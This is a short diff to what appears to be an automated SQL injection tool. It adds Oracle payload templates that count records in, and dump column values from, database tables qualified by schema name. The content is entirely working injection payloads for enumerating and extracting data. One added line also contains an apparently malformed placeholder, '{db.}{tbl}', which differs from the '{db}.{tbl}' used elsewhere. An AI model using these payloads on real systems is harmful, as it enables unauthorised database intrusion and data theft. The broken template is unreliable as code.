@@ -2087,7 +2087,7 @@ PAYLOADS_RECS_COUNT = {
         "(SELECT LTRIM(STR(COUNT(DISTINCT({col})))) FROM {tbl})",
         "(SELECT COUNT(*) FROM {db}.{tbl})",
     ],
-    "Oracle": ["(SELECT COUNT(*) FROM {tbl})"],
+    "Oracle": ["(SELECT COUNT(*) FROM {tbl})", "(SELECT COUNT(*) FROM {db}.{tbl})"],
 }
 
 
@@ -2116,7 +2116,9 @@ PAYLOADS_RECS_DUMP = {
     "Oracle": [
         # "(SELECT {col} FROM (SELECT {col},ROWNUM AS LIMIT FROM {tbl} {col} ORDER BY ROWNUM) WHERE LIMIT=1)",
         "(SELECT {col} FROM (SELECT {col},ROWNUM AS LIMIT FROM {tbl}) WHERE LIMIT=1)",
+        "(SELECT {col} FROM (SELECT {col},ROWNUM AS LIMIT FROM {db.}{tbl}) WHERE LIMIT=1)",
         "(SELECT {col} FROM (SELECT qq.*,ROWNUM AS LIMIT FROM {tbl} qq ORDER BY ROWNUM) WHERE LIMIT=1)",
+        "(SELECT {col} FROM (SELECT qq.*,ROWNUM AS LIMIT FROM {db}.{tbl} qq ORDER BY ROWNUM) WHERE LIMIT=1)",
     ],
 }
 
